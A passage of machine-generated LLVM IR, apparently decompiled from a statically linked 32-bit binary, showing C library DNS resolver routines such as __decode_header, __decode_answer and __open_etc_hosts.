  %v2_80575fe.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80575fe

dec_label_pc_80575fe:                             ; preds = %entry, %dec_label_pc_8057568
  %v2_80575fe = phi i32 [ %v0_8057551, %entry ], [ %v2_80575fe.pre, %dec_label_pc_8057568 ]
  %v0_8057600 = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_8057568 ]
  store i32 %v2_80575fe, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8057600

; uselistorder directives
  uselistorder i32 45, { 5, 2, 6, 4, 1, 0, 3 }
  uselistorder i32 41, { 2, 1, 0 }
  uselistorder i32 37, { 2, 1, 3, 0 }
  uselistorder i32 33, { 4, 3, 5, 1, 2, 0 }
  uselistorder label %dec_label_pc_80575fe, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  %v0_8057604 = load i32, i32* @ebx, align 4
  store i32 %v0_8057604, i32* %stack_var_-4, align 4
  %v4_8057605 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_8057605, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_805760d = load i8, i8* %tmp2, align 1
  %v3_805760d = zext i8 %v2_805760d to i32
  %v1_8057610 = add i32 %v4_8057605, 1
  %v2_8057610 = inttoptr i32 %v1_8057610 to i8*
  %v3_8057610 = load i8, i8* %v2_8057610, align 1
  %v4_8057610 = zext i8 %v3_8057610 to i32
  %v2_8057614 = mul nuw nsw i32 %v3_805760d, 256
  %v2_8057617 = or i32 %v4_8057610, %v2_8057614
  %v2_8057619 = inttoptr i32 %tmp to i32*
  store i32 %v2_8057617, i32* %v2_8057619, align 4
  %v0_805761b = load i32, i32* @ecx, align 4
  %v1_805761b = add i32 %v0_805761b, 2
  %v2_805761b = inttoptr i32 %v1_805761b to i8*
  %v3_805761b = load i8, i8* %v2_805761b, align 1
  %tmp6 = icmp slt i8 %v3_805761b, 0
  %v2_805761f = zext i1 %tmp6 to i32
  %v1_8057622 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057622 = add i32 %v1_8057622, 4
  %v3_8057622 = inttoptr i32 %v2_8057622 to i32*
  store i32 %v2_805761f, i32* %v3_8057622, align 4
  %v0_8057625 = load i32, i32* @ecx, align 4
  %v1_8057625 = add i32 %v0_8057625, 2
  %v2_8057625 = inttoptr i32 %v1_8057625 to i8*
  %v3_8057625 = load i8, i8* %v2_8057625, align 1
  %v3_8057628 = udiv i8 %v3_8057625, 8
  %tmp7 = urem i8 %v3_8057628, 16
  %v1_805762b = zext i8 %tmp7 to i32
  %v1_805762e = load i32, i32* %ebx.global-to-local, align 4
  %v2_805762e = add i32 %v1_805762e, 8
  %v3_805762e = inttoptr i32 %v2_805762e to i32*
  store i32 %v1_805762b, i32* %v3_805762e, align 4
  %v0_8057631 = load i32, i32* @ecx, align 4
  %v1_8057631 = add i32 %v0_8057631, 2
  %v2_8057631 = inttoptr i32 %v1_8057631 to i8*
  %v3_8057631 = load i8, i8* %v2_8057631, align 1
  %div = udiv i8 %v3_8057631, 4
  %tmp8 = urem i8 %div, 2
  %v1_8057638 = zext i8 %tmp8 to i32
  %v1_805763b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805763b = add i32 %v1_805763b, 12
  %v3_805763b = inttoptr i32 %v2_805763b to i32*
  store i32 %v1_8057638, i32* %v3_805763b, align 4
  %v0_805763e = load i32, i32* @ecx, align 4
  %v1_805763e = add i32 %v0_805763e, 2
  %v2_805763e = inttoptr i32 %v1_805763e to i8*
  %v3_805763e = load i8, i8* %v2_805763e, align 1
  %div5 = udiv i8 %v3_805763e, 2
  %tmp9 = urem i8 %div5, 2
  %v1_8057644 = zext i8 %tmp9 to i32
  %v1_8057647 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057647 = add i32 %v1_8057647, 16
  %v3_8057647 = inttoptr i32 %v2_8057647 to i32*
  store i32 %v1_8057644, i32* %v3_8057647, align 4
  %v0_805764a = load i32, i32* @ecx, align 4
  %v1_805764a = add i32 %v0_805764a, 2
  %v2_805764a = inttoptr i32 %v1_805764a to i8*
  %v3_805764a = load i8, i8* %v2_805764a, align 1
  %tmp10 = urem i8 %v3_805764a, 2
  %v1_805764e = zext i8 %tmp10 to i32
  %v1_8057651 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057651 = add i32 %v1_8057651, 20
  %v3_8057651 = inttoptr i32 %v2_8057651 to i32*
  store i32 %v1_805764e, i32* %v3_8057651, align 4
  %v0_8057654 = load i32, i32* @ecx, align 4
  %v1_8057654 = add i32 %v0_8057654, 3
  %v2_8057654 = inttoptr i32 %v1_8057654 to i8*
  %v3_8057654 = load i8, i8* %v2_8057654, align 1
  %tmp11 = icmp slt i8 %v3_8057654, 0
  %v2_8057658 = zext i1 %tmp11 to i32
  %v1_805765b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805765b = add i32 %v1_805765b, 24
  %v3_805765b = inttoptr i32 %v2_805765b to i32*
  store i32 %v2_8057658, i32* %v3_805765b, align 4
  %v0_805765e = load i32, i32* @ecx, align 4
  %v1_805765e = add i32 %v0_805765e, 3
  %v2_805765e = inttoptr i32 %v1_805765e to i8*
  %v3_805765e = load i8, i8* %v2_805765e, align 1
  %tmp12 = urem i8 %v3_805765e, 16
  %v1_8057662 = zext i8 %tmp12 to i32
  %v1_8057665 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057665 = add i32 %v1_8057665, 28
  %v3_8057665 = inttoptr i32 %v2_8057665 to i32*
  store i32 %v1_8057662, i32* %v3_8057665, align 4
  %v0_8057668 = load i32, i32* @ecx, align 4
  %v1_8057668 = add i32 %v0_8057668, 4
  %v2_8057668 = inttoptr i32 %v1_8057668 to i8*
  %v3_8057668 = load i8, i8* %v2_8057668, align 1
  %v4_8057668 = zext i8 %v3_8057668 to i32
  %v1_805766c = add i32 %v0_8057668, 5
  %v2_805766c = inttoptr i32 %v1_805766c to i8*
  %v3_805766c = load i8, i8* %v2_805766c, align 1
  %v4_805766c = zext i8 %v3_805766c to i32
  %v2_8057670 = mul nuw nsw i32 %v4_8057668, 256
  %v2_8057673 = or i32 %v4_805766c, %v2_8057670
  %v1_8057675 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057675 = add i32 %v1_8057675, 32
  %v3_8057675 = inttoptr i32 %v2_8057675 to i32*
  store i32 %v2_8057673, i32* %v3_8057675, align 4
  %v0_8057678 = load i32, i32* @ecx, align 4
  %v1_8057678 = add i32 %v0_8057678, 6
  %v2_8057678 = inttoptr i32 %v1_8057678 to i8*
  %v3_8057678 = load i8, i8* %v2_8057678, align 1
  %v4_8057678 = zext i8 %v3_8057678 to i32
  %v1_805767c = add i32 %v0_8057678, 7
  %v2_805767c = inttoptr i32 %v1_805767c to i8*
  %v3_805767c = load i8, i8* %v2_805767c, align 1
  %v4_805767c = zext i8 %v3_805767c to i32
  %v2_8057680 = mul nuw nsw i32 %v4_8057678, 256
  %v2_8057683 = or i32 %v4_805767c, %v2_8057680
  %v1_8057685 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057685 = add i32 %v1_8057685, 36
  %v3_8057685 = inttoptr i32 %v2_8057685 to i32*
  store i32 %v2_8057683, i32* %v3_8057685, align 4
  %v0_8057688 = load i32, i32* @ecx, align 4
  %v1_8057688 = add i32 %v0_8057688, 8
  %v2_8057688 = inttoptr i32 %v1_8057688 to i8*
  %v3_8057688 = load i8, i8* %v2_8057688, align 1
  %v4_8057688 = zext i8 %v3_8057688 to i32
  %v1_805768c = add i32 %v0_8057688, 9
  %v2_805768c = inttoptr i32 %v1_805768c to i8*
  %v3_805768c = load i8, i8* %v2_805768c, align 1
  %v4_805768c = zext i8 %v3_805768c to i32
  %v2_8057690 = mul nuw nsw i32 %v4_8057688, 256
  %v2_8057693 = or i32 %v4_805768c, %v2_8057690
  %v1_8057695 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057695 = add i32 %v1_8057695, 40
  %v3_8057695 = inttoptr i32 %v2_8057695 to i32*
  store i32 %v2_8057693, i32* %v3_8057695, align 4
  %v0_8057698 = load i32, i32* @ecx, align 4
  %v1_8057698 = add i32 %v0_8057698, 10
  %v2_8057698 = inttoptr i32 %v1_8057698 to i8*
  %v3_8057698 = load i8, i8* %v2_8057698, align 1
  %v4_8057698 = zext i8 %v3_8057698 to i32
  %v1_805769c = add i32 %v0_8057698, 11
  %v2_805769c = inttoptr i32 %v1_805769c to i8*
  %v3_805769c = load i8, i8* %v2_805769c, align 1
  %v4_805769c = zext i8 %v3_805769c to i32
  %v2_80576a0 = mul nuw nsw i32 %v4_8057698, 256
  %v2_80576a3 = or i32 %v4_805769c, %v2_80576a0
  %v1_80576a5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80576a5 = add i32 %v1_80576a5, 44
  %v3_80576a5 = inttoptr i32 %v2_80576a5 to i32*
  store i32 %v2_80576a3, i32* %v3_80576a5, align 4
  %v2_80576ad = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80576ad, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 11, { 10, 11, 5, 6, 9, 14, 7, 2, 12, 13, 0, 8, 3, 1, 4 }
  uselistorder i32 7, { 12, 13, 3, 8, 4, 2, 9, 14, 15, 16, 17, 5, 0, 11, 6, 7, 10, 1 }
  uselistorder i32 6, { 25, 26, 2, 3, 27, 28, 0, 7, 19, 14, 15, 9, 31, 16, 29, 30, 4, 1, 5, 8, 13, 17, 18, 23, 10, 11, 12, 20, 21, 22, 24, 6 }
  uselistorder i8 2, { 0, 1, 2, 3, 4, 20, 5, 12, 25, 21, 6, 22, 7, 8, 9, 10, 23, 24, 11, 18, 13, 19, 14, 15, 17, 16 }
  uselistorder i8 16, { 0, 1, 2, 4, 5, 6, 3 }
  uselistorder i8 8, { 0, 2, 7, 3, 4, 1, 5, 6 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_80576b0 = load i32, i32* @edi, align 4
  %v0_80576b1 = load i32, i32* @esi, align 4
  %v0_80576b2 = load i32, i32* @ebx, align 4
  store i32 %v0_80576b2, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @esi, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @ebx, align 4
  %v0_80576bf = load i32, i32* @eax, align 4
  %v1_80576c2 = inttoptr i32 %tmp3 to i32*
  %v2_80576c2 = load i32, i32* %v1_80576c2, align 4
  %v7_80576c4 = inttoptr i32 %v2_80576c2 to i8*
  %v8_80576c4 = call i32 @__encode_dotted(i8* %v7_80576c4, i32 %tmp2, i32 %tmp, i32 %v0_80576bf, i32 %v0_80576b2, i32 %v0_80576b1, i32 %v0_80576b0)
  store i32 %v8_80576c4, i32* @ecx, align 4
  %v2_80576ce = icmp slt i32 %v8_80576c4, 0
  br i1 %v2_80576ce, label %dec_label_pc_80576fd, label %dec_label_pc_80576d2

dec_label_pc_80576d2:                             ; preds = %entry
  %v0_80576d2 = load i32, i32* @ebx, align 4
  %v2_80576d2 = sub i32 %v0_80576d2, %v8_80576c4
  %v1_80576d4 = add i32 %v2_80576d2, -3
  %v6_80576d4 = sub i32 2, %v2_80576d2
  %v7_80576d4 = and i32 %v6_80576d4, %v2_80576d2
  %v8_80576d4 = icmp slt i32 %v7_80576d4, 0
  %v9_80576d4 = icmp eq i32 %v1_80576d4, 0
  %v10_80576d4 = icmp slt i32 %v1_80576d4, 0
  %v3_80576d7 = icmp eq i1 %v10_80576d4, %v8_80576d4
  %v4_80576d7 = icmp eq i1 %v9_80576d4, false
  %v5_80576d7 = and i1 %v4_80576d7, %v3_80576d7
  br i1 %v5_80576d7, label %dec_label_pc_80576de, label %dec_label_pc_80576d9

dec_label_pc_80576d9:                             ; preds = %dec_label_pc_80576d2
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_80576fd

dec_label_pc_80576de:                             ; preds = %dec_label_pc_80576d2
  %v0_80576de = load i32, i32* @edi, align 4
  %v2_80576de = add i32 %v0_80576de, %v8_80576c4
  store i32 %v2_80576de, i32* @edx, align 4
  %v1_80576e1 = add i32 %v8_80576c4, 4
  store i32 %v1_80576e1, i32* @ecx, align 4
  %v0_80576e4 = load i32, i32* @esi, align 4
  %v1_80576e4 = add i32 %v0_80576e4, 5
  %v2_80576e4 = inttoptr i32 %v1_80576e4 to i8*
  %v3_80576e4 = load i8, i8* %v2_80576e4, align 1
  %v3_80576e8 = inttoptr i32 %v2_80576de to i8*
  store i8 %v3_80576e4, i8* %v3_80576e8, align 1
  %v0_80576ea = load i32, i32* @esi, align 4
  %v1_80576ea = add i32 %v0_80576ea, 4
  %v2_80576ea = inttoptr i32 %v1_80576ea to i32*
  %v3_80576ea = load i32, i32* %v2_80576ea, align 4
  %v1_80576ed = trunc i32 %v3_80576ea to i8
  %v2_80576ed = load i32, i32* @edx, align 4
  %v3_80576ed = add i32 %v2_80576ed, 1
  %v4_80576ed = inttoptr i32 %v3_80576ed to i8*
  store i8 %v1_80576ed, i8* %v4_80576ed, align 1
  %v0_80576f0 = load i32, i32* @esi, align 4
  %v1_80576f0 = add i32 %v0_80576f0, 9
  %v2_80576f0 = inttoptr i32 %v1_80576f0 to i8*
  %v3_80576f0 = load i8, i8* %v2_80576f0, align 1
  %v2_80576f4 = load i32, i32* @edx, align 4
  %v3_80576f4 = add i32 %v2_80576f4, 2
  %v4_80576f4 = inttoptr i32 %v3_80576f4 to i8*
  store i8 %v3_80576f0, i8* %v4_80576f4, align 1
  %v0_80576f7 = load i32, i32* @esi, align 4
  %v1_80576f7 = add i32 %v0_80576f7, 8
  %v2_80576f7 = inttoptr i32 %v1_80576f7 to i32*
  %v3_80576f7 = load i32, i32* %v2_80576f7, align 4
  %v1_80576fa = trunc i32 %v3_80576f7 to i8
  %v2_80576fa = load i32, i32* @edx, align 4
  %v3_80576fa = add i32 %v2_80576fa, 3
  %v4_80576fa = inttoptr i32 %v3_80576fa to i8*
  store i8 %v1_80576fa, i8* %v4_80576fa, align 1
  %v0_80576fd.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80576fd

dec_label_pc_80576fd:                             ; preds = %entry, %dec_label_pc_80576d9, %dec_label_pc_80576de
  %v0_80576fd = phi i32 [ %v8_80576c4, %entry ], [ -1, %dec_label_pc_80576d9 ], [ %v0_80576fd.pre, %dec_label_pc_80576de ]
  %v2_80576ff = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80576ff, i32* @ebx, align 4
  store i32 %v0_80576b0, i32* @edi, align 4
  ret i32 %v0_80576fd

; uselistorder directives
  uselistorder i32 %v1_80576d4, { 1, 0 }
  uselistorder i32 %v2_80576d2, { 0, 2, 1 }
  uselistorder i32 %v8_80576c4, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32 -3, { 3, 2, 1, 5, 0, 4 }
  uselistorder label %dec_label_pc_80576fd, { 2, 1, 0 }
}

define i32 @__length_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v2_805770f = call i32 @__length_dotted(i32 %tmp, i32 %tmp2)
  %v2_8057717 = icmp slt i32 %v2_805770f, 0
  br i1 %v2_8057717, label %dec_label_pc_805771e, label %dec_label_pc_805771b

dec_label_pc_805771b:                             ; preds = %entry
  %v1_805771b = add i32 %v2_805770f, 4
  br label %dec_label_pc_805771e

dec_label_pc_805771e:                             ; preds = %entry, %dec_label_pc_805771b
  %v0_8057721 = phi i32 [ %v2_805770f, %entry ], [ %v1_805771b, %dec_label_pc_805771b ]
  ret i32 %v0_8057721

; uselistorder directives
  uselistorder label %dec_label_pc_805771e, { 1, 0 }
}

define i32 @__decode_answer() local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8057724 = load i32, i32* @ebp, align 4
  %v0_8057725 = load i32, i32* @edi, align 4
  %v0_8057726 = load i32, i32* @esi, align 4
  %v0_8057727 = load i32, i32* @ebx, align 4
  store i32 %v0_8057727, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_8057748 = ptrtoint i32* %stack_var_-272 to i32
  %v4_8057755 = call i32 @__decode_dotted(i32 %tmp4, i32 %tmp7, i32 %v2_8057748, i32 256)
  store i32 %v4_8057755, i32* @edi, align 4
  %v3_805775f = icmp slt i32 %v4_8057755, 0
  br i1 %v3_805775f, label %dec_label_pc_8057810, label %dec_label_pc_8057767

dec_label_pc_8057767:                             ; preds = %entry
  %v0_8057767 = load i32, i32* @ebx, align 4
  %v3_8057767 = add i32 %v0_8057767, %v4_8057755
  %v0_8057769 = load i32, i32* @esi, align 4
  %v2_8057769 = sub i32 %v0_8057769, %v3_8057767
  %v1_805776f = add i32 %v2_8057769, -10
  %v10_805776f = icmp slt i32 %v1_805776f, 0
  store i32 %v1_805776f, i32* @esi, align 4
  %v1_8057776 = icmp eq i1 %v10_805776f, false
  br i1 %v1_8057776, label %dec_label_pc_805777f, label %dec_label_pc_8057778

dec_label_pc_8057778:                             ; preds = %dec_label_pc_8057767
  br label %dec_label_pc_8057810

dec_label_pc_805777f:                             ; preds = %dec_label_pc_8057767
  %v6_8057786 = add i32 %v3_8057767, %tmp4
  store i32 %v6_8057786, i32* @ebx, align 4
  %v1_8057792 = bitcast i32* %stack_var_-272 to i8*
  %v2_8057792 = call i32 @__GI_strdup(i8* %v1_8057792)
  %v1_8057797 = load i32, i32* @ebp, align 4
  %v2_8057797 = inttoptr i32 %v1_8057797 to i32*
  store i32 %v2_8057792, i32* %v2_8057797, align 4
  %v0_805779a = load i32, i32* @ebx, align 4
  %v1_805779a = add i32 %v0_805779a, 4
  store i32 %v1_805779a, i32* %esi.global-to-local, align 4
  %v1_805779d = inttoptr i32 %v0_805779a to i8*
  %v2_805779d = load i8, i8* %v1_805779d, align 1
  %v3_805779d = zext i8 %v2_805779d to i32
  %v1_80577a0 = add i32 %v0_805779a, 1
  %v2_80577a0 = inttoptr i32 %v1_80577a0 to i8*
  %v3_80577a0 = load i8, i8* %v2_80577a0, align 1
  %v4_80577a0 = zext i8 %v3_80577a0 to i32
  %v2_80577a4 = mul nuw nsw i32 %v3_805779d, 256
  %v2_80577a7 = or i32 %v4_80577a0, %v2_80577a4
  %v1_80577a9 = load i32, i32* @ebp, align 4
  %v2_80577a9 = add i32 %v1_80577a9, 4
  %v3_80577a9 = inttoptr i32 %v2_80577a9 to i32*
  store i32 %v2_80577a7, i32* %v3_80577a9, align 4
  %v0_80577ac = load i32, i32* @ebx, align 4
  %v1_80577ac = add i32 %v0_80577ac, 2
  %v2_80577ac = inttoptr i32 %v1_80577ac to i8*
  %v3_80577ac = load i8, i8* %v2_80577ac, align 1
  %v4_80577ac = zext i8 %v3_80577ac to i32
  %v1_80577b0 = add i32 %v0_80577ac, 3
  %v2_80577b0 = inttoptr i32 %v1_80577b0 to i8*
  %v3_80577b0 = load i8, i8* %v2_80577b0, align 1
  %v4_80577b0 = zext i8 %v3_80577b0 to i32
  %v2_80577b4 = mul nuw nsw i32 %v4_80577ac, 256
  %v2_80577b7 = or i32 %v4_80577b0, %v2_80577b4
  %v1_80577b9 = load i32, i32* @ebp, align 4
  %v2_80577b9 = add i32 %v1_80577b9, 8
  %v3_80577b9 = inttoptr i32 %v2_80577b9 to i32*
  store i32 %v2_80577b7, i32* %v3_80577b9, align 4
  %v0_80577bc = load i32, i32* @ebx, align 4
  %v1_80577bc = add i32 %v0_80577bc, 4
  %v2_80577bc = inttoptr i32 %v1_80577bc to i8*
  %v3_80577bc = load i8, i8* %v2_80577bc, align 1
  %v4_80577bc = zext i8 %v3_80577bc to i32
  %v0_80577c0 = load i32, i32* %esi.global-to-local, align 4
  %v1_80577c0 = add i32 %v0_80577c0, 1
  %v2_80577c0 = inttoptr i32 %v1_80577c0 to i8*
  %v3_80577c0 = load i8, i8* %v2_80577c0, align 1
  %v4_80577c0 = zext i8 %v3_80577c0 to i32
  %v2_80577c4 = mul nuw i32 %v4_80577bc, 16777216
  %v2_80577c7 = mul nuw nsw i32 %v4_80577c0, 65536
  %v1_80577ca = add i32 %v0_80577c0, 2
  %v2_80577ca = inttoptr i32 %v1_80577ca to i8*
  %v3_80577ca = load i8, i8* %v2_80577ca, align 1
  %v4_80577ca = zext i8 %v3_80577ca to i32
  %v2_80577ce = mul nuw nsw i32 %v4_80577ca, 256
  %v2_80577d1 = or i32 %v2_80577c7, %v2_80577c4
  %v1_80577d3 = add i32 %v0_80577c0, 3
  %v2_80577d3 = inttoptr i32 %v1_80577d3 to i8*
  %v3_80577d3 = load i8, i8* %v2_80577d3, align 1
  %v4_80577d3 = zext i8 %v3_80577d3 to i32
  %v2_80577d7 = or i32 %v4_80577d3, %v2_80577d1
  %v2_80577d9 = or i32 %v2_80577d7, %v2_80577ce
  store i32 %v2_80577d9, i32* @ecx, align 4
  %v1_80577db = load i32, i32* @ebp, align 4
  %v2_80577db = add i32 %v1_80577db, 12
  %v3_80577db = inttoptr i32 %v2_80577db to i32*
  store i32 %v2_80577d9, i32* %v3_80577db, align 4
  %v0_80577de = load i32, i32* @ebx, align 4
  %v1_80577de = add i32 %v0_80577de, 8
  %v2_80577de = inttoptr i32 %v1_80577de to i8*
  %v3_80577de = load i8, i8* %v2_80577de, align 1
  %v4_80577de = zext i8 %v3_80577de to i32
  %v1_80577e2 = add i32 %v0_80577de, 9
  %v2_80577e2 = inttoptr i32 %v1_80577e2 to i8*
  %v3_80577e2 = load i8, i8* %v2_80577e2, align 1
  %v4_80577e2 = zext i8 %v3_80577e2 to i32
  %v2_80577e6 = mul nuw nsw i32 %v4_80577de, 256
  %v1_80577e9 = add i32 %v0_80577de, 10
  %v2_80577ec = or i32 %v4_80577e2, %v2_80577e6
  store i32 %v2_80577ec, i32* @edx, align 4
  %v1_80577ee = load i32, i32* @ebp, align 4
  %v2_80577ee = add i32 %v1_80577ee, 20
  %v3_80577ee = inttoptr i32 %v2_80577ee to i32*
  store i32 %v1_80577e9, i32* %v3_80577ee, align 4
  %v0_80577f1 = load i32, i32* @edx, align 4
  %v1_80577f1 = load i32, i32* @ebp, align 4
  %v2_80577f1 = add i32 %v1_80577f1, 16
  %v3_80577f1 = inttoptr i32 %v2_80577f1 to i32*
  store i32 %v0_80577f1, i32* %v3_80577f1, align 4
  %v1_80577fb = add i32 %v3_8057767, 10
  %v1_80577fe = load i32, i32* @ebp, align 4
  %v2_80577fe = add i32 %v1_80577fe, 24
  %v3_80577fe = inttoptr i32 %v2_80577fe to i32*
  store i32 %v1_80577fb, i32* %v3_80577fe, align 4
  %v4_8057801 = load i32, i32* @edx, align 4
  %v5_8057805 = icmp slt i32 %v1_805776f, %v4_8057801
  br i1 %v5_8057805, label %dec_label_pc_8057807, label %dec_label_pc_805780c

dec_label_pc_8057807:                             ; preds = %dec_label_pc_805777f
  br label %dec_label_pc_8057810

dec_label_pc_805780c:                             ; preds = %dec_label_pc_805777f
  %v1_805780c = load i32, i32* @edi, align 4
  %v2_805780c = add i32 %v4_8057801, 10
  %v3_805780c = add i32 %v2_805780c, %v1_805780c
  br label %dec_label_pc_8057810

dec_label_pc_8057810:                             ; preds = %entry, %dec_label_pc_8057807, %dec_label_pc_8057778, %dec_label_pc_805780c
  %v0_8057816 = phi i32 [ %v4_8057755, %entry ], [ -1, %dec_label_pc_8057807 ], [ %v1_805776f, %dec_label_pc_8057778 ], [ %v3_805780c, %dec_label_pc_805780c ]
  %v2_8057818 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8057818, i32* @ebx, align 4
  store i32 %v0_8057726, i32* @esi, align 4
  store i32 %v0_8057725, i32* @edi, align 4
  store i32 %v0_8057724, i32* @ebp, align 4
  ret i32 %v0_8057816

; uselistorder directives
  uselistorder i32 %v1_805776f, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8057767, { 1, 0, 2 }
  uselistorder i32 %v4_8057755, { 1, 0, 2, 3 }
  uselistorder i32 16777216, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 10, 9 }
  uselistorder i32 3, { 61, 62, 63, 64, 65, 66, 26, 3, 27, 16, 67, 7, 68, 28, 9, 8, 4, 1, 2, 0, 29, 5, 30, 50, 17, 51, 38, 39, 40, 41, 42, 43, 69, 18, 19, 44, 31, 15, 11, 12, 10, 13, 33, 54, 34, 55, 35, 56, 36, 57, 37, 58, 45, 32, 46, 59, 60, 20, 47, 21, 48, 49, 52, 53, 14, 22, 23, 24, 25, 6 }
  uselistorder i32 -10, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8057810, { 3, 1, 2, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v3_805782d = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_805e3a5.1035 to i32), i32 ptrtoint (i32* @global_var_805e370.1020 to i32))
  store i32 %v3_805782d, i32* @eax, align 4
  %v1_8057835 = icmp eq i32 %v3_805782d, 0
  %v1_8057837 = icmp eq i1 %v1_8057835, false
  br i1 %v1_8057837, label %dec_label_pc_805784d, label %dec_label_pc_8057839

dec_label_pc_8057839:                             ; preds = %entry
  %v3_8057845 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_805e3b0.1036 to i32), i32 ptrtoint (i32* @global_var_805e370.1020 to i32))
  br label %dec_label_pc_805784d

dec_label_pc_805784d:                             ; preds = %entry, %dec_label_pc_8057839
  %v0_8057850 = phi i32 [ %v3_805782d, %entry ], [ %v3_8057845, %dec_label_pc_8057839 ]
  ret i32 %v0_8057850

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_805e370.1020 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_805784d, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp59 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_8057851 = load i32, i32* @ebp, align 4
  %v0_8057852 = load i32, i32* @edi, align 4
  %v0_8057853 = load i32, i32* @esi, align 4
  %v0_8057854 = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_8057862 = sub i32 0, %arg6
  %v1_8057864 = urem i32 %v1_8057862, 4
  %v2_8057864 = icmp eq i32 %v1_8057864, 0
  store i32 %v1_8057864, i32* %eax.global-to-local, align 4
  br i1 %v2_8057864, label %dec_label_pc_8057875, label %dec_label_pc_8057869

dec_label_pc_8057869:                             ; preds = %entry
  %v2_8057869 = sub i32 %arg7, %v1_8057864
  %v7_8057869 = icmp ugt i32 %v1_8057864, %arg7
  br i1 %v7_8057869, label %dec_label_pc_8057b19, label %dec_label_pc_8057871

dec_label_pc_8057871:                             ; preds = %dec_label_pc_8057869
  %v2_8057871 = add i32 %v1_8057864, %arg6
  store i32 %v2_8057871, i32* @ebx, align 4
  store i32 %v2_8057869, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057875

dec_label_pc_8057875:                             ; preds = %entry, %dec_label_pc_8057871
  %v0_805787e = phi i32 [ %arg6, %entry ], [ %v2_8057871, %dec_label_pc_8057871 ]
  %v0_8057881 = phi i32 [ %arg7, %entry ], [ %v2_8057869, %dec_label_pc_8057871 ]
  %tmp149 = icmp ult i32 %v0_8057881, 32
  br i1 %tmp149, label %dec_label_pc_8057b19, label %dec_label_pc_805787e

dec_label_pc_805787e:                             ; preds = %dec_label_pc_8057875
  %v1_805787e = add i32 %v0_805787e, 32
  store i32 %v1_805787e, i32* %eax.global-to-local, align 4
  %v1_8057881 = add i32 %v0_8057881, -32
  store i32 %v1_8057881, i32* @ebp, align 4
  %v5_8057884 = inttoptr i32 %v1_805787e to i8*
  %v12_8057888 = icmp eq i32 %arg4, 1
  br i1 %v12_8057888, label %dec_label_pc_80579aa, label %dec_label_pc_8057893

dec_label_pc_8057893:                             ; preds = %dec_label_pc_805787e
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_805789a = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_805789a, align 4
  %tmp150 = icmp ult i32 %v1_8057881, 4
  br i1 %tmp150, label %dec_label_pc_8057b19, label %dec_label_pc_80578a6

dec_label_pc_80578a6:                             ; preds = %dec_label_pc_8057893
  %v0_80578a6 = load i32, i32* %edx.global-to-local, align 4
  %v1_80578a6 = add i32 %v0_80578a6, -36
  store i32 %v1_80578a6, i32* %eax.global-to-local, align 4
  %tmp151 = icmp ult i32 %v1_80578a6, 8
  br i1 %tmp151, label %dec_label_pc_8057b19, label %dec_label_pc_80578b2

dec_label_pc_80578b2:                             ; preds = %dec_label_pc_80578a6
  %v0_80578b2 = load i32, i32* @ebp, align 4
  %tmp152 = icmp ult i32 %v0_80578b2, 16
